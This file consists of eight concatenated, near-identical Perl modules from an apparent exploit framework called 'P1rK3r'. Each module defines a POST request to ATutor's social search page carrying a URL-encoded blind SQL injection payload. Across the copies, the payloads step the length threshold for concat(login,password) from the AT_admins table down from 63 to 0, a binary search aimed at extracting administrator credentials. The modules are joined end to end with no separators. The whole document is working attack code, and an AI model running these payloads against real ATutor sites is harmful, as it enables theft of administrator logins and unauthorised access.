package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_f=jOO%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e63/%2a%2a/or/%2a%2a/1%3d%27&rand_key=f&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_M=ZTb%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e31/%2a%2a/or/%2a%2a/1%3d%27&rand_key=M&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_s=ysn%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e15/%2a%2a/or/%2a%2a/1%3d%27&rand_key=s&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_w=yBc%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e7/%2a%2a/or/%2a%2a/1%3d%27&rand_key=w&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_X=ssp%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e3/%2a%2a/or/%2a%2a/1%3d%27&rand_key=X&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_E=nwu%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e1/%2a%2a/or/%2a%2a/1%3d%27&rand_key=E&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_U=hll%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e0/%2a%2a/or/%2a%2a/1%3d%27&rand_key=U&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::ATUTOR::MSF::Sqli;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ATUTOR);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Sqli";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'Sqli',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'mods/_standard/social/index_public.php',
                        PAYLOAD      => 'search_friends_p=GfH%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3d0/%2a%2a/or/%2a%2a/1%3d%27&rand_key=p&search=Search',
                        TEXT         => 'Sending First Exploit Request On : /mods/_standard/social/index_public.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;